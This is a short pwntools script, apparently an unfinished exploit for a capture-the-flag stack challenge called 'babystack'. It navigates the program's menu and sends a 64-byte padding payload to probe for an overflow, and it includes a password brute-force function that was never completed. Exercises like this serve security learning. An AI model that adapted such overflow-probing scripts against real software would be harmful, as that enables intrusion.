from pwn import *

io = process('./babystack')#, env={'LD_PRELOAD':'./libc_64.so.6'})

def brute_password():
	print(io.recvuntil(b'>> '))
	io.sendline(b'1')
	print(io.recvuntil(b'Your passowrd :'))
	

print(io.recv())
io.sendline('1')
print(io.recv())
io.sendline()
print(io.recv())
io.sendline('3')
print(io.recv())
payload = 'A'*64
pause()
io.send(payload)
print(io.recv())
io.sendline('3')
print(io.recv())